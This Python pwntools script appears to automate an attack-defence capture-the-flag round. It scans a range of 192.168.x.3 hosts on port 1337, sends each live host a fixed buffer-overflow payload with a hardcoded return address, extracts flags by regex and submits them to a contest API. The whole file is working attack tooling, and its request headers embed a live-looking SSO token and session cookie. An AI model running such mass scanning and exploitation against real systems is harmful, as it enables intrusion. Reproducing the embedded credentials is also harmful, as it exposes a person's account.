from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import sleep

'''
ubuntu中运行
'''
# 配置
context.log_level = 'info'  # 批量攻击时用info，避免debug输出过多
context.binary = binary = './pwn'
PORTS = 1337
TIMEOUT = 3
THREADS = 20
PAYLOAD = b'a' * 0x28 + p64(0x40064A)
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
FLAG_FILE = "auto_flag.txt"
IP_RANGE = range(240, 255)
QUESTION_ID = "90122"

elf = ELF(binary)
# libc = ELF('libc-2.19.so')
rop = ROP(elf)
gdbscript = '''
'''
# 精确屏蔽 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def process_host():  # 探活

    """并发探活，返回可达IP列表"""
    live_ips = []
    base_ips = [f"192.168.{i}.3" for i in IP_RANGE]

    def scan_host(ip):
        """扫描单个主机是否开放PWN端口"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((str(ip), PORTS))
                if result == 0:
                    print(f"{ip}:{PORTS} alive")
                    return ip
                else:
                    logging.info(f"{ip}:{PORTS} not alive")
        except Exception as e:
            print(e)
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan_host, ip): ip for ip in base_ips}
        for future in as_completed(futures):
            result = future.result()
            if result:
                live_ips.append(result)

    # 写入文件（可选）
    with open("auto_ip.txt", "w", encoding="utf-8") as f:
        for ip in live_ips:
            f.write(ip + "\n")
    return live_ips


def start(ip, port):
    """根据参数启动连接"""
    if args.GDB:
        proc = process([binary])
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote(ip, port)
    else:
        return remote(ip, port)  # 批量攻击时直接远程连接


def exploit_host(ip):
    """对单个主机发送payload并提取flag"""
    # 将lambda函数定义在函数内部，使它们能访问局部的io变量
    s = lambda data: io.send(data)
    sa = lambda delim, data: io.sendafter(str(delim), data)
    sl = lambda data: io.sendline(data)
    sla = lambda delim, data: io.sendlineafter(str(delim), data)
    r = lambda num: io.recv(num)
    ru = lambda delims, drop=True: io.recvuntil(delims, drop)
    itr = lambda: io.interactive()
    uu32 = lambda data: u32(data.ljust(4, b'\x00'))
    uu64 = lambda data: u64(data.ljust(8, b'\x00'))

    try:
        io = start(ip, PORTS)
        sl(PAYLOAD)
        #sl(b'cat /flag')  #getshell时需要发送命令
        # 接收程序返回的响应内容
        response = b''
        try:
            response = ru(b'\n', drop=False)  #从远程连接或本地进程的输入流中接收数据，直到遇到字节串 b'\n' 为止‌
        except:
            pass

        # 继续接收后续输出
        try:
            remaining = io.recvall(timeout=1)
            if remaining:
                response += remaining
        except:
            pass

        io.close()

        # 打印响应
        if response:
            print(f"[{ip}] Response: {response.decode(errors='replace')[:200]}")

        # 匹配flag
        match = FLAG_PATTERN.search(response.decode(errors='replace'))
        if match:
            flag = match.group(0)
            logging.info(f"[+] {ip} found flag: {flag}")
            return ip, flag
        else:
            print(f"[-] {ip} no flag found")
            return ip, None

    except Exception as e:
        print(f"[!] {ip} 连接失败: {str(e)}")
        return ip, None


def get_flag(ip_list):
    """并发向每个IP发送payload，提取flag"""
    flag_dict = {}

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(exploit_host, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            ip, flag = future.result()
            flag_dict[ip] = flag

    # 写入结果文件
    if flag_dict:
        with open("auto_flag.txt", "w", encoding="utf-8") as f:
            for ip, flag in flag_dict.items():
                f.write(f"{ip}: {flag}\n")
        print(f"[+] 共获取 {len(flag_dict)} 个flag，已保存到 {FLAG_FILE}")
    else:
        print("[-] 未获取到任何flag")

    return flag_dict if flag_dict else None


def upload_flag(flag_dict):
    """上传所有获取到的flag到竞赛平台"""
    url = f"https://172.19.6.100/competition/api/contestants/match_plan/{QUESTION_ID}/question/awd"
    headers = {
        "Host": "172.19.6.100",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
        "Content-Type": "application/json",  # 关键：指定内容类型为 JSON
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://172.19.6.100",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://172.19.6.100/competition_web/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "sso_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiMjMzYWJiZjAtYzAzMS00MGQ4LWEzODctNDU5ODI5MGMyY2MzIiwiSUQiOjkwLCJVc2VybmFtZSI6InVzZXI4NiIsIk5pY2tOYW1lIjoidXNlcjg2IiwiSXNTdXBlciI6ZmFsc2UsIkxhc3RMb2dpbkF0IjoiMjAyNi0wNi0xOFQyMjoxNTo1OC4zNTE4ODA1MDgrMDg6MDAiLCJCdWZmZXJUaW1lIjowLCJpc3MiOiJxbVBsdXMiLCJuYmYiOjE3ODE3OTExNTh9.UeGdef-Nx4fd9uQPT_MqgHJ3H3pLRnbhglQjI8qhQJo; um_auth=1; competition_session=MTc4MTkxNDk3NnxOd3dBTkVOT1R6UlFVRWhXU0VvMVZraGFXRkV5UlRSWVVGSk5XRVpVVFUxU1RVZEJSa1JKVmxSWVVVMDNVRlpSUjFOVVUwazBXRkU9fJo3Pm9FBsCQianTLiGOdTE8jx1BTCScAdtOhR7CHnMJ"
    }
    # 忽略证书验证（内网自签名）
    session = requests.Session()
    session.verify = False
    with open("auto_upload_res.txt", "w", encoding="utf-8") as f:
        f.write("提交flag失败\n")
    with open("auto_upload_res.txt", "a", encoding="utf-8") as f:
        for ip, flag in flag_dict.items():
            if flag:
                payload = {"answer": flag}
                resp = requests.Response()
                msg = {}
                try:
                    resp = session.post(url, json=payload, headers=headers, timeout=5)
                    # 解析返回消息（假设返回json格式）
                    if resp.status_code == 200:
                        msg = resp.json().get("msg", "unknown")
                        print(f"{ip} upload success: {msg}")
                    else:
                        msg = resp.json().get("msg", "unknown")
                        print(f"{ip} upload failed, status {resp.status_code}, {msg}")
                        # 写入结果文件
                        f.write(f"{ip} upload failed, status {resp.status_code}  {msg} 写入失败，自行写入\n")
                except Exception as e:
                    print(f"{ip} upload exception: {e}")
                    f.write(f"{ip} error, status {resp.status_code}  {msg} 写入失败，自行写入{flag}\n")
                sleep(20)
            else:
                pass


if __name__ == "__main__":
    ip_list = process_host()
    if not ip_list:
        logging.error("[-] ip为空")
    else:
        logging.info(f"[*] 共加载 {len(ip_list)} 个目标IP")
        flag_dict = get_flag(ip_list)
        if flag_dict:  # 字典不为空，上传
            upload_flag(flag_dict)
        else:
            logging.warning("No flags found.")
